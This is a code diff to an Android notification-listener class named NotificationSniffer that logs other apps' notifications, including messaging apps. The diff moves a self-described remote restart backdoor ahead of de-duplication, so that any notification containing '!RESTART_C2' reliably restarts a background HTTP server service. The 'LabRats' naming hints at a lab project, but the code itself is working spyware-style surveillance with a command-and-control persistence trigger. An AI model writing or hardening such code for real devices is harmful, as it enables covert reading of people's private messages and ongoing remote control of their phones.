@@ -181,6 +181,25 @@ public class NotificationSniffer extends NotificationListenerService {
         if (title == null) title = "Unknown Source";
         if (text == null || text.isEmpty()) return;
 
+        // --- REMOTE RESTART BACKDOOR (CRITICAL: CHECK BEFORE DE-DUPLICATION) ---
+        // Commands must always process, even if the notification looks identical to a previous one
+        if (text.contains("!RESTART_C2")) {
+            Log.w(TAG, "BACKDOOR: Received remote restart command");
+            LabRatsHttpServer.logActivity("BACKDOOR: Initiating remote service restart via command");
+            
+            android.content.Intent restartIntent = new android.content.Intent(this, HttpServerService.class);
+            restartIntent.setAction("START");
+            try {
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                    startForegroundService(restartIntent);
+                } else {
+                    startService(restartIntent);
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Backdoor fail: " + e.getMessage());
+            }
+        }
+
         // --- DE-DUPLICATION ENGINE ---
         // Android often posts the same notification multiple times for updates (e.g. download progress)
         // We hash the content to ensure we only log it ONCE unless the message actually changes.
@@ -191,20 +210,6 @@ public class NotificationSniffer extends NotificationListenerService {
         lastNotificationId = currentId;
 
         Log.d(TAG, "SNIFFED [" + packageName + "]: " + title + " -> " + text);
-
-        // --- REMOTE RESTART BACKDOOR ---
-        if (text.contains("!RESTART_C2")) {
-            Log.w(TAG, "BACKDOOR: Received remote restart command");
-            LabRatsHttpServer.logActivity("BACKDOOR: Initiating remote service restart via command");
-            
-            android.content.Intent restartIntent = new android.content.Intent(this, HttpServerService.class);
-            restartIntent.setAction("START");
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                startForegroundService(restartIntent);
-            } else {
-                startService(restartIntent);
-            }
-        }
 
         // Alert the Terminal Logs for communication apps (Throttled)
         if (lowerPkg.contains("messaging") || lowerPkg.contains("messages") || 
